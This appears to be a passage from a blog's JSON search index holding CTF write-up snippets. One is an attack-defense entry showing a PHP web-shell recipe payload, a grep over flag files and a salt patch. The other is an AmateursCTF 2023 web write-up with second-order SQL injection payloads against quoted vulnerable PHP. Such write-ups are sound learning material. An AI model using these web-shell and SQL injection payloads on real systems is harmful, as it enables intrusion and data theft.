md5($this-&amp;gt;request-&amp;gt;session-&amp;gt;getUser()-&amp;gt;username), checkFileExistence: false);...The attack.json file gives us both the username and recipe title for all the flags for the tick. So we can then view any files by sending viewPath=files/{MD5 of username}/{filename}.md as a cookie in a GET request.RCEFrom looking in the tulip logs we seen that one team was able to load their own recipes with PHP code in order to get RCE. We were able to replicate it by creating a recipe with this as the recipes description&amp;lt;?php system($_GET[&#39;rce&#39;]);?&amp;gt;Once we called our recipe, we can give a url parameter ?rce=grep+-ERho+&#39;ENO%5BA-Za-z0-9+%5C/=%5D%7B48%7D&#39;+/var/www/html/files to read all files matching the flag regex.PatchOur patch for this was fairly simple. We just added a salt of ‘irelandwithoutre’ to the md5 of the username for the directory name.```phppublic function createRecipe(array $data): Recipe{$directory = resolvePath(‘files/’ . md5($this-&amp;gt;request-&amp;gt;session-&amp;gt;getUser()-&amp;gt;username . ‘irelandwithoutre’), checkFileExistence: false);…" }, { "title": "AmateursCTF 2023", "url": "/posts/AmateursCTF/", "categories": "Jeopardy", "tags": "ctf, web, sqli", "date": "2023-07-20 00:00:00 +0000", "snippet": "cps remasteredThe description is already hinting at SQL injection so we know what we’re getting into hereIt didnt take too long to spot the SQLi in register.php&amp;lt;?php $message = &quot;&quot;; mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT); if (isset($_POST[&quot;username&quot;]) &amp;amp;&amp;amp; isset($_POST[&quot;password&quot;])) { try{ $mysqli = new mysqli(&quot;p:db&quot;, &quot;app&quot;, &quot;ead549a4a7c448926bfe5d0488e1a736798a9a8ee150418d27414bd02d37b9e5&quot;, &quot;cps&quot;); $result = $mysqli-&amp;gt;query(sprintf(&quot;INSERT INTO users (username, password) VALUES (&#39;%s&#39;, &#39;%s&#39;)&quot;, $_POST[&quot;username&quot;], $_POST[&quot;password&quot;])); if ($result) { $token = bin2hex(random_bytes(16)); $add_token = $mysqli-&amp;gt;query(sprintf(&quot;INSERT INTO tokens (token, username) VALUES (&#39;%s&#39;, &#39;%s&#39;)&quot;, $token, $_POST[&quot;username&quot;])); if ($add_token) { setcookie(&quot;token&quot;, $token); $message = &quot;&amp;lt;p&amp;gt;Successfully created account. You are now logged in&amp;lt;/p&amp;gt;&quot;; } } else { $message = &quot;&amp;lt;p&amp;gt;Something went wrong. Username &quot; + $_POST[&quot;username&quot;] + &quot; (might) have been taken already&amp;lt;/p&amp;gt;&quot;; } } catch (Exception $e) { if (str_starts_with($e, &quot;mysqli_sql_exception: Duplicate entry &#39;&quot;) and str_contains($e, &quot;&#39; for key &#39;PRIMARY&#39;&quot;)) { $message = sprintf(&quot;&amp;lt;p&amp;gt;Something went wrong. Username starting with %s has been taken already&amp;lt;/p&amp;gt;&quot;, substr(explode(&quot;&#39; for key&quot;, substr($e, 39))[0], 0, 5)); } } }?&amp;gt;I thought we could update password field using the insert query however the permissions for the SQL user only allow us to update the best_cps column.CREATE USER &#39;app&#39; @&#39;%&#39; IDENTIFIED BY &#39;ead549a4a7c448926bfe5d0488e1a736798a9a8ee150418d27414bd02d37b9e5&#39;;GRANT SELECT ON cps.* TO &#39;app&#39; @&#39;%&#39;;GRANT INSERT ON cps.* TO &#39;app&#39; @&#39;%&#39;;GRANT UPDATE (best_cps) ON cps.users TO &#39;app&#39; @&#39;%&#39;;FLUSH PRIVILEGES;So instead let’s look at this other SQLi in login.php&amp;lt;?php $message = &quot;&quot;; mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT); if (isset($_POST[&quot;username&quot;]) &amp;amp;&amp;amp; isset($_POST[&quot;password&quot;])) { $mysqli = new mysqli(&quot;p:db&quot;, &quot;app&quot;, &quot;ead549a4a7c448926bfe5d0488e1a736798a9a8ee150418d27414bd02d37b9e5&quot;, &quot;cps&quot;); $stmt = $mysqli-&amp;gt;prepare(&quot;SELECT username, password FROM users WHERE username = ? AND password = ?&quot;); $stmt-&amp;gt;bind_param(&quot;ss&quot;, $_POST[&quot;username&quot;], $_POST[&quot;password&quot;]); $stmt-&amp;gt;execute(); $result = $stmt-&amp;gt;get_result(); $row = $result-&amp;gt;fetch_assoc(); if ($row) { $token = bin2hex(random_bytes(16)); $add_token = $mysqli-&amp;gt;query(sprintf(&quot;INSERT INTO tokens (token, username) VALUES (&#39;%s&#39;, &#39;%s&#39;)&quot;, $token, $_POST[&quot;username&quot;])); if ($add_token) { setcookie(&quot;token&quot;, $token); echo &quot;&amp;lt;p&amp;gt;You are now logged in&amp;lt;/p&amp;gt;&quot;; } } else { echo &quot;&amp;lt;p&amp;gt;Something went wrong.&amp;lt;/p&amp;gt;&quot;; } }?&amp;gt;On first glance it might seem like we can’t exploit the SQLi in the INSERT query however if we register an account with our payload as it’s username we can reach the vulnerable query.So register a user with the username admin\\&#39;);-- - - we need to escape the quote as register.php itself is injectable.Afterwards log in as the user we just created and we get the flag on the index (flag was password of admin user).What our injection does here is make the token we have the token for the admin user instead of the user we created.Flag: amateursCTF{h0w_f@st_can_you_cl1ck?}Other notes from cps remasteredThe intended solution was to extract the flag bit by bit using boolean based blind.If we did have UPDATE permissions for password column we could extract data through the password field in our INSERT query like this:Username: myuserPassword: xd&#39;),(&#39;myuser&#39;,&#39;derp&#39;) ON DUPLICATE KEY UPDATE password=@@version-- -Query:INSERT INTO users (username, password) VALUES (&#39;myuser&#39;, &#39;xd&#39;),(&#39;myuser&#39;,&#39;derp&#39;) ON DUPLICATE KEY UPDATE password=@@version-- -&#39;)While exploiting this you may get an error like:Error in query (1093): Table ‘users’ is specified twice, both as a target for ‘INSERT’ and as a separate source for dataYou can work around this issue using subqueries:xd&#39;),(&#39;myuser&#39;,&#39;derp&#39;) ON DUPLICATE KEY UPDATE password=(SELECT t.password FROM (SELECT * FROM users t WHERE t.username=&#39;admin&#39;) as t)-- -" } ]
